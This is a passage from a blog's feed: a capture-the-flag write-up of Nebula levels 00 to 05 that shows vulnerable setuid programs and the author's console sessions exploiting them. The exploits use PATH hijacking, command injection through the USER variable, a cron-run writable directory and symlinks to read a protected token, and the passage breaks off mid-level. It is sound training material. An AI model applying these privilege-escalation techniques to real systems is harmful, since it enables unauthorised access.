&lt;p&gt;Firstly: Thanks for taking the time to read this. Please leave any feedback or
comments below (or twitter/email if you prefer).&lt;/p&gt;
&lt;p&gt;Secondly: If you are here because you are also playing &lt;em&gt;Nebula&lt;/em&gt; and are
new to this like I am, this write up might seem like magic.
You're struggling to figure out how to get past a certain
level and then this text makes it seem like magic.&lt;/p&gt;
&lt;p&gt;It's not like that. I spent a lot of time working through the later levels as I
quickly learned how little I knew. Much time was spent researching and learning
about things I thought I already knew. Turns out I knew very little about them.
There were a lot of failures on the way, but if I kept those in, this post
would be much much longer. The thought process seems very simple in write ups,
but trust me, there's quite a bit of puzzling and thinking to do.&lt;/p&gt;
&lt;p&gt;It's early days for me too, and I very much enjoyed &lt;em&gt;Nebula&lt;/em&gt;, and have a whole
new set of tools and ideas in my arsenal for the next challenge.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Cracking Nebula Part 1</title><link href="http://unlogic.co.uk/2014/06/24/cracking-nebula-part-1/" rel="alternate"></link><updated>2014-06-24T22:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-06-24:2014/06/24/cracking-nebula-part-1/</id><summary type="html">&lt;p&gt;On &lt;a class="reference external" href="http://www.exploit-exercises.com/"&gt;Exploit Exercises&lt;/a&gt; you can find a
number of CTF (Capture The Flag) VM images where you can practice your
exploiting, hacking and general computer savviness. I've been working
my way through the Nebula machine and figured I might as well write
up the process both for other's benefit if they get stuck, and also as
a sort of diary for myself, so I can refer back to any info if I need to.&lt;/p&gt;
&lt;p&gt;The Nebula VM can be downloaded from the &lt;a class="reference external" href="http://www.exploit-exercises.com/download"&gt;Exploit Exercises download page&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To quickly explain what you need to do: Login in as user &lt;code&gt;levelxx&lt;/code&gt; and then run &lt;code&gt;getflag&lt;/code&gt; as user &lt;code&gt;flagxx&lt;/code&gt;.
There's some explanations for each level on the machine's page over at Exploit Exercises.&lt;/p&gt;
&lt;div class="section" id="level-00"&gt;
&lt;h2&gt;Level 00&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the &amp;quot;flag00&amp;quot; account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;p&gt;Alternatively, look at the find man page.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So somewhere from the root directory is a file will run as the flag00 user. As stated you can either look for it, or
use &lt;code&gt;find&lt;/code&gt; to search for it. I chose to do a little bit of both. Running &lt;code&gt;find&lt;/code&gt; from the root of a system can take some time so I chose to take a look first. Amongst the usual directories at linux root level is a &lt;code&gt;rofs&lt;/code&gt; directory. So let's take a look inside.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;flag00&amp;#64;nebula:/rofs$&lt;/span&gt; ls
&lt;span class="go"&gt;bin   dev  home        lib    mnt  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  media  opt  root  sbin  srv      tmp  var&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Looks the same, but let's run a find in here.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level00&amp;#64;nebula:/rofs$&lt;/span&gt; find -user flag00 -print 2&amp;gt; /dev/null
&lt;span class="go"&gt;./bin/.../flag00
./home/flag00
./home/flag00/.bash_logout
./home/flag00/.bashrc
./home/flag00/.profile&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;There's the usual stuff, but there's also &lt;code&gt;./bin/.../flag00&lt;/code&gt;. If you run this you can get the flag:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level00&amp;#64;nebula:/rofs$&lt;/span&gt; ./bin/.../flag00
&lt;span class="go"&gt;Congrats, now run getflag to get your flag!
&lt;/span&gt;&lt;span class="gp"&gt;flag00&amp;#64;nebula:/rofs$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-01"&gt;
&lt;h2&gt;Level 01&lt;/h2&gt;
&lt;blockquote&gt;
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/blockquote&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;gid_t&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;gid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/usr/bin/env echo and now what?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So let's see about this vulnerability. It doesn't accept user input, but luckily there's only one place where it actually runs anything, so that makes it easier to narrow down where its weakness is. The &lt;code&gt;system&lt;/code&gt; call executes an &lt;code&gt;echo&lt;/code&gt; but there's a small oversight. It calls &lt;code&gt;echo&lt;/code&gt; without an explicit path, can you see where this is going? As &lt;code&gt;flag01&lt;/code&gt; runs as user &lt;code&gt;flag01&lt;/code&gt;, anything it executes will also run under that user.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level01&amp;#64;nebula:/home/flag01$&lt;/span&gt; mkdir /tmp/mybin
&lt;span class="gp"&gt;level01&amp;#64;nebula:/home/flag01$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /tmp/mybin
&lt;span class="gp"&gt;level01&amp;#64;nebula:/tmp/mybin$&lt;/span&gt; which getflag
&lt;span class="go"&gt;/bin/getflag
&lt;/span&gt;&lt;span class="gp"&gt;level01&amp;#64;nebula:/tmp/mybin$&lt;/span&gt; cp /bin/getflag &lt;span class="nb"&gt;echo&lt;/span&gt;
&lt;span class="gp"&gt;level01&amp;#64;nebula:/tmp/mybin$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag01
&lt;span class="gp"&gt;level01&amp;#64;nebula:/home/flag01$&lt;/span&gt; &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp/mybin:&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="gp"&gt;level01&amp;#64;nebula:/home/flag01$&lt;/span&gt; ./flag01
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-02"&gt;
&lt;h2&gt;Level 02&lt;/h2&gt;
&lt;blockquote&gt;
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/blockquote&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="kt"&gt;gid_t&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;gid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

 &lt;span class="n"&gt;asprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/echo %s is cool&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;about to call system(&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;This is very similar to &lt;em&gt;Level01&lt;/em&gt; but this time they seem to have patched the system call. However this time they've added something to the statement that we have control over. Look at line 22 and think about how we can make use of that.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level02&amp;#64;nebula:/home/flag02$&lt;/span&gt; &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'&amp;quot;&amp;quot;;getflag'&lt;/span&gt;
&lt;span class="gp"&gt;level02&amp;#64;nebula:/home/flag02$&lt;/span&gt; ./flag02
&lt;span class="go"&gt;about to call system(&amp;quot;/bin/echo &amp;quot;&amp;quot;;getflag is cool&amp;quot;)

You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-03"&gt;
&lt;h2&gt;Level 03&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.&lt;/p&gt;
&lt;p&gt;There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So first things first let's take a look at that crontab&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level03&amp;#64;nebula:/home/flag03$&lt;/span&gt; cat writable.sh
&lt;span class="gp"&gt;#&lt;/span&gt;!/bin/sh
&lt;span class="go"&gt;
for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
        rm -f &amp;quot;$i&amp;quot;
done&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Ok, so it will take a shell script in the &lt;code&gt;writeable.d&lt;/code&gt; directory, execute it and then delete it. Luckily the directory is world read/write, allowing us to add out own script. As the crontab will run the script as the &lt;code&gt;flag03&lt;/code&gt; user, we might as well just run the &lt;code&gt;getflag&lt;/code&gt; from it. We'll capture some output to make sure it worked.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level03&amp;#64;nebula:/home/flag03$&lt;/span&gt; cat writeable.d/getit
&lt;span class="go"&gt;/bin/getflag &amp;gt; /tmp/gotit
&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; &lt;span class="nb"&gt;wait&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; the script to run....
&lt;span class="gp"&gt;level03&amp;#64;nebula:/home/flag03$&lt;/span&gt; cat /tmp/gotflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-04"&gt;
&lt;h2&gt;Level 04&lt;/h2&gt;
&lt;blockquote&gt;
This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/blockquote&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s [file to read]&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strstr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You may not access '%s'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;O_RDONLY&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Unable to open %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;rc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Unable to read fd %d&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Ok, so let's take a look at what happens when we run the file&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level04&amp;#64;nebula:/home/flag04$&lt;/span&gt; ls
&lt;span class="go"&gt;flag04  token
&lt;/span&gt;&lt;span class="gp"&gt;level04&amp;#64;nebula:/home/flag04$&lt;/span&gt; ./flag04
&lt;span class="go"&gt;./flag04 [file to read]
&lt;/span&gt;&lt;span class="gp"&gt;level04&amp;#64;nebula:/home/flag04$&lt;/span&gt; ./flag04 token
&lt;span class="go"&gt;You may not access 'token'&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So we can't access token. Looking at the code there's a check to see if the file is named &lt;code&gt;token&lt;/code&gt;. We can't simply copy the &lt;em&gt;token&lt;/em&gt; file because it's read only by the flag user. So there's only one thing for it: symlinks&lt;/p&gt;
&lt;p&gt;Then get the flag (some ssh output cut for brevity)&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level04&amp;#64;nebula:/home/flag04$&lt;/span&gt; ln -s /home/flag04/token /tmp/myfile
&lt;span class="gp"&gt;level04&amp;#64;nebula:/home/flag04$&lt;/span&gt; ./flag04 /tmp/myfile
&lt;span class="go"&gt;06508b5e-8909-4f38-b630-fdb148a848a2
&lt;/span&gt;&lt;span class="gp"&gt;level04&amp;#64;nebula:/home/flag04$&lt;/span&gt; ssh flag04&amp;#64;localhost
&lt;span class="go"&gt;
flag04&amp;#64;localhost's password:

&lt;/span&gt;&lt;span class="gp"&gt;flag04&amp;#64;nebula:~$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So the output of the command is a &lt;em&gt;token&lt;/em&gt; which is the term used for the password of the flag's user. Using this to logon as &lt;em&gt;flag04&lt;/em&gt; and run &lt;code&gt;getflag&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-05"&gt;
&lt;h2&gt;Level 05&lt;/h2&gt;
&lt;blockquote&gt;
Check the flag05 home directory. You are looking for weak directory permissions&lt;/blockquote&gt;
&lt;p&gt;Ok, let's do that&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level05&amp;#64;nebula:~$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag05
&lt;span class="gp"&gt;level05&amp;#64;nebula:/home/flag05$&lt;/span&gt; ls -la
&lt;span class="go"&gt;total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     420 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;That &lt;em&gt;backup&lt;/em&gt; directory looks like our target&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level05&amp;#64;nebula:/home/flag05$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; .backup/
&lt;span class="gp"&gt;level05&amp;#64;nebula:/home/flag05/.backup$&lt;/span&gt; ls -la
&lt;span class="go"&gt;total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
&lt;/span&gt;&lt;span class="gp"&gt;level05&amp;#64;nebula:/home/flag05/.backup$&lt;/span&gt; tar xvzf backup-19072011.tgz -C /tmp
&lt;span class="go"&gt;.ssh/
